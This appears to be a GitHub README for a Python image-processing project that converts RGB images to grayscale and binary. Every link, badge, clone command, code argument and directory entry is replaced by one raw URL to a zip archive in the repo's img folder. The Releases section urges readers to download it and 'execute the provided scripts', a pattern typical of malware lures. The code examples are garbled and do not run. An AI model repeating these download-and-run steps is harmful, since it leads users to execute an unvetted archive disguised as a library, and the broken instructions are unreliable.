# Image Dimensionality Reduction: RGB to Grayscale and Binary Conversion

![Image Processing](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Processing-Project-brightgreen)

![Python](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%2B-blue)

[![Releases](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip)

## Overview

This project provides a straightforward way to convert RGB images into grayscale and binary formats. By leveraging luminance calculations for grayscale conversion and applying thresholding for binary conversion, users can easily manipulate image data for various applications in computer vision and machine learning.

### Key Features

- **Grayscale Conversion**: Converts RGB images to grayscale using luminance calculations.
- **Binary Conversion**: Transforms grayscale images into binary format using thresholding.
- **Image Saving**: Functions to save the processed images in various formats.
- **Built with Popular Libraries**: Utilizes NumPy for numerical operations and PIL (Python Imaging Library) for image handling.

## Installation

To get started, clone the repository to your local machine:

```bash
git clone https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
```

Navigate to the project directory:

```bash
cd image-dimensionality-reduction
```

### Requirements

Make sure you have Python 3.8 or higher installed. You will also need to install the following libraries:

- NumPy
- PIL (Pillow)

You can install the required libraries using pip:

```bash
pip install numpy pillow
```

## Usage

### Basic Workflow

1. **Import the Module**: Start by importing the necessary functions from the module.
   
   ```python
   from image_processing import convert_to_grayscale, convert_to_binary, save_image
   ```

2. **Load an Image**: Use PIL to load an image file.

   ```python
   from PIL import Image

   image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
   ```

3. **Convert to Grayscale**:

   ```python
   grayscale_image = convert_to_grayscale(image)
   ```

4. **Convert to Binary**:

   ```python
   binary_image = convert_to_binary(grayscale_image, threshold=128)
   ```

5. **Save the Processed Images**:

   ```python
   save_image(grayscale_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
   save_image(binary_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
   ```

### Function Details

#### `convert_to_grayscale(image)`

This function takes an RGB image as input and returns the grayscale version of the image using luminance calculations.

- **Parameters**: 
  - `image`: An instance of a PIL Image in RGB format.
  
- **Returns**: 
  - A PIL Image in grayscale format.

#### `convert_to_binary(grayscale_image, threshold)`

This function converts a grayscale image to binary format based on a specified threshold.

- **Parameters**:
  - `grayscale_image`: A PIL Image in grayscale format.
  - `threshold`: An integer value (0-255) that determines the cutoff for binary conversion.
  
- **Returns**:
  - A PIL Image in binary format.

#### `save_image(image, file_path)`

This function saves a processed image to the specified file path.

- **Parameters**:
  - `image`: A PIL Image to be saved.
  - `file_path`: A string representing the path where the image will be saved.
  
- **Returns**: 
  - None.

## Examples

Here are some examples of how to use the functions provided in this repository.

### Example 1: Convert an Image to Grayscale

```python
from PIL import Image
from image_processing import convert_to_grayscale, save_image

image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
grayscale_image = convert_to_grayscale(image)
save_image(grayscale_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
```

### Example 2: Convert an Image to Binary

```python
from PIL import Image
from image_processing import convert_to_grayscale, convert_to_binary, save_image

image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
grayscale_image = convert_to_grayscale(image)
binary_image = convert_to_binary(grayscale_image, threshold=128)
save_image(binary_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
```

## Directory Structure

```
image-dimensionality-reduction/
│
├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
└── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
```

## Topics Covered

- **AI**: This project serves as a foundational tool for AI applications in image processing.
- **Artificial Intelligence**: Understanding how images can be manipulated for machine learning tasks.
- **Binary Conversion**: Key concept in image processing that reduces image complexity.
- **Computer Vision**: Fundamental techniques for image analysis.
- **Image Processing**: Core functionalities of the project.
- **Luminance**: Essential for accurate grayscale conversion.
- **Machine Learning**: Preprocessing images for ML models.
- **ML**: Techniques that benefit from image data.
- **RGB to Binary**: Conversion methods to simplify image data.
- **RGB to Gray**: A common transformation in image processing.
- **Thresholding**: A technique used to convert grayscale images to binary.

## Contributing

We welcome contributions to improve this project. If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Submit a pull request with a clear description of your changes.

## License

This project is licensed under the MIT License. See the LICENSE file for details.

## Releases

For the latest updates and releases, visit the [Releases section](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip). Download the latest version and execute the provided scripts to start processing your images.

## Acknowledgments

- Thanks to the contributors who have helped improve this project.
- Special thanks to the developers of NumPy and PIL for their excellent libraries.

## Contact

For questions or suggestions, please reach out via the GitHub Issues page or contact the repository owner directly.

## Final Note

This project aims to simplify image processing tasks, making it easier for developers and researchers to handle image data effectively. For more detailed information on the functions and their applications, refer to the code comments and documentation within the repository.

[![Releases](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip)